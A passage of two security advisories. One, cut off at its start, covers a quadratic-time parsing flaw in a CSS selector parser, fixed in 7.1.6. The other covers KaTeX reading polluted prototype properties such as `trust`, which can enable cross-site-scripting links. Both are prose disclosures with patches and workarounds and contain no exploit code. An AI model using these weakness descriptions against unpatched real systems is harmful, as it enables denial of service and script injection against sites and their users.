`uniqs()`, the `indices.forEach` loop, and the Sass-interpolation filter.
Parsing a 400 KB flat selector took ~34 s on a modern laptop, fully occupying a
single thread. A benign selector of identical byte size parses in tens of
milliseconds, so the cost is driven by the index count, not the input size.
The nesting depth of such a selector is 0, so the `maxNestingDepth` guard added
in 7.1.3 offers no protection.

Reachability is deployment dependent. Only consumers that parse untrusted,
attacker-supplied selectors synchronously in a request path are exposed, for
example CSS sanitizers, CSS-in-JS services and online playgrounds. Ordinary
build-time use on trusted sources is not affected.

### Patches

Fixed in 7.1.6. The three passes now use Set membership tests, making parsing
linear in the number of indexes. There is no behaviour change: parsing is
byte-identical on a differential corpus of 8413 selectors.

### Workarounds

Cap the size of selectors accepted from untrusted sources before parsing.

security_advisory.summary: KaTeX: Existing prototype pollution can bypass trust restrictions
security_advisory.description:
### Impact

KaTeX can act as a read-side prototype pollution gadget in applications where `Object.prototype` has already been polluted, or where an attacker can influence the prototype of the renderer options object. (KaTeX does not enable said prototype pollution. This advisory applies when combining KaTeX with other vulnerable software that allows for prototype pollution.)

Affected versions may treat inherited properties from `Object.prototype` as renderer options, internal setting metadata, or namespace entries. In particular, an inherited `trust` value will be treated as though the application explicitly enabled trusted rendering, rather than using the documented default of `false`.

With attacker-controlled mathematical expressions, this can produce links capable of user-interaction cross-site scripting or load attacker-selected external resources. Exploitation requires the consuming application to insert KaTeX output into a web page without a separate sanitizer. (KaTeX does not execute scripts merely by rendering an expression.)

Other inherited settings can alter rendering behavior or resource limits. Inherited setting metadata can affect how defaults and supplied options are processed, while inherited namespace properties can be mistaken for defined macros or other internal values.

### Patches

Upgrade to KaTeX v0.18.2 to remove this vulnerability.

### Workarounds

- Address any prototype-pollution vulnerability in the application or its dependencies.
- `delete Object.prototype.trust`, `delete Object.prototype.default`, and `delete Object.prototype.processor` before calling KaTeX
- Do not allow untrusted input to control the renderer options object or its prototype.
- Sanitize KaTeX-generated HTML before inserting it into a document.

### Details

KaTeX previously used ordinary JavaScript property access in the following contexts:

- Renderer settings could be inherited from the prototype of the options object.
- Internal `default` and `processor` setting metadata could be inherited from `Object.prototype`.
- Namespace lookup could treat inherited properties as built-in definitions.
- Namespace group restoration could preserve an inherited property as though it had been an explicitly defined value.

The fix adds own-property checks to each of these paths. Inherited properties are no longer accepted as renderer settings, setting metadata, namespace definitions, or values to be restored after a group ends.

### For more information

If you have any questions or comments about this advisory:

- Open an issue or security advisory in the [KaTeX repository](https://github.com/KaTeX/KaTeX/)
- Email us at [katex-security@mit.edu](mailto:katex-security@mit.edu)
